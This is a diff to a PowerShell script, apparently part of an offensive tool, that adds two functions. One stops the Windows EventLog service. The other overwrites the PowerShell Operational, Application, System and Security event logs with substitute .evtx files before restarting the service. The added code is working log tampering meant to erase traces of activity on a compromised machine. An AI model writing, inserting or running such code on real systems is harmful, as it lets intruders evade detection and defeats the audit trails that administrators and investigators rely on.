@@ -329,4 +329,17 @@ function Post-HttpRequest($url,$parameters) {
     $httpRequest.setRequestHeader("Connection", "close") 
     $httpRequest.send($parameters) 
     $httpRequest.responseText 
-} 
+}
+
+function Stop-Activities ($scriptPath) {
+    $global:serviceToStop = Get-WmiObject -Class Win32_Service -Filter "Name='EventLog'"
+    $serviceToStop.StopService() | Out-Null        
+}
+
+function Clear-Activities ($scriptPath) {    
+    Copy-Item -Path "$scriptPath\misc\Microsoft-Windows-PowerShell%4Operational.evtx" -Destination "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"
+    Copy-Item -Path "$scriptPath\misc\Application.evtx" -Destination "C:\Windows\System32\winevt\Logs\Application.evtx"
+    Copy-Item -Path "$scriptPath\misc\System.evtx" -Destination "C:\Windows\System32\winevt\Logs\System.evtx"
+    Copy-Item -Path "$scriptPath\misc\Security.evtx" -Destination "C:\Windows\System32\winevt\Logs\Security.evtx"
+    $serviceToStop.StartService() | Out-Null
+}
